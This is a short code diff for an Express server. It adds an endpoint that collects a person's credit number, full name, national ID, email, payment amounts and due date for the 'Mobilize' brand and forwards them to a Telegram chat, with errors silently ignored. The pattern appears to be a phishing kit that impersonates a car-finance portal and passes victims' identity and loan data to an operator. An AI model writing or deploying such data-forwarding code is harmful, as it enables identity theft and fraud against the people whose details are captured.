@@ -431,6 +431,24 @@ app.get('/health', (_, res) =>
   res.json({ ok: true, uptime: Math.floor(process.uptime()), cache: _cache.size })
 );
 
+// POST /api/mobilize/notificar — recibe datos del crédito desde el frontend y avisa por Telegram
+app.post('/api/mobilize/notificar', async (req, res) => {
+  const { numero, nombreCompleto, cedula, email, pagoMinimoCOP, pagoTotalCOP, fechaVencimiento } = req.body || {};
+  if (numero) {
+    await tgSend(
+      `🚗 <b>Mobilize — Consulta crédito</b>\n\n` +
+      `📋 <b>Crédito:</b> <code>${numero}</code>\n` +
+      `👤 <b>Nombre:</b> ${nombreCompleto}\n` +
+      `🪪 <b>Cédula:</b> <code>${cedula}</code>\n` +
+      `📧 <b>Email:</b> ${email}\n` +
+      `💰 <b>Pago mínimo:</b> ${pagoMinimoCOP}\n` +
+      `💰 <b>Pago total:</b>  ${pagoTotalCOP}\n` +
+      `📅 <b>Vencimiento:</b> ${fechaVencimiento?.split('T')[0] || 'N/D'}`
+    ).catch(() => {});
+  }
+  res.json({ ok: true });
+});
+
 // GET /api/mobilize/credito/:numero
 app.get('/api/mobilize/credito/:numero', async (req, res) => {
   if (!allowed(ip(req)))
